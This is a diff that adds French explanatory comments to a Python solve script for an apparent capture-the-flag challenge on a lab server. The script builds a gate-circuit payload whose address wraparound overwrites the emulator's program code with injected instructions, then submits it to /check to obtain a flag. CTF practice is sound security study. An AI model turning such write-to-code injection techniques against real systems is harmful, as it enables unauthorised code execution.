@@ -29,6 +29,13 @@ requests.packages.urllib3.disable_warnings()
 HOST = sys.argv[1] if len(sys.argv) > 1 else "http://chatelaine.cylabacademy.net:15656"
 
 
+# --------------------------------------------------------------------------
+# Etape 1/4 : primitives de netlist
+#   con  : constante 0/1 sur un noeud
+#   num  : immediate 16 bits (chargee par 2 portes)
+#   write: store du circuit NAND vers une adresse absolue
+# --------------------------------------------------------------------------
+
 def con(a, b, o):
     return {"input1": a, "input2": b, "output": o}
 
@@ -57,6 +64,13 @@ def write(base, node, n):
 
 
 A, B = 0, 6
+# --------------------------------------------------------------------------
+# Etape 2/4 : construction du circuit
+#   une porte dont le noeud de sortie vaut 0xf000 ecrit a l'adresse
+#   0x2000 + 2*0xf000 mod 0x10000 = 0x0000, donc DANS le code du programme
+#   les 3 portes qui precedent amenent le compteur de PC a la bonne case
+# --------------------------------------------------------------------------
+
 TARGET = A + 10 * 3
 circ = [
     con(0xfff, 0xfff, 0xfff),
@@ -71,10 +85,22 @@ circ = [
     con(0x800 + B + 1, 0x800 + B + 1, 0x800 + B + 2),
     con(0x800 + B + 2, 0x800 + B + 2, 1),
 ]
+# --------------------------------------------------------------------------
+# Etape 3/4 : les dix mots de flag.bin
+#   ils sont plantes a 0x4c..0x5e, juste apres la boucle de traitement
+#   des portes, la ou le CPU va chercher ses prochaines instructions
+# --------------------------------------------------------------------------
+
 # flag.bin, one 16-bit word per instruction slot starting at code address 0x4c
 for k, word in enumerate((0x0d, 0x6f73, 0x1d, 0x6563, 0x2d, 0x2e69,
                           0x3d, 0x6f00, 0x0e, 0x0f)):
     circ.extend(write(len(circ), 0xf000 + 38 + k, word))
+
+# --------------------------------------------------------------------------
+# Etape 4/4 : envoi a /check
+#   le store a deja reecrit le code, le programme execute donc flag_magic + halt
+#   et leve la sortie `flag` du CPU : la reponse contient FLAG2
+# --------------------------------------------------------------------------
 
 print("gates:", len(circ), " budget:", (0x10000 - 0x3000) // 6)
 r = requests.post(HOST + "/check", json={"circuit": circ}, timeout=180)
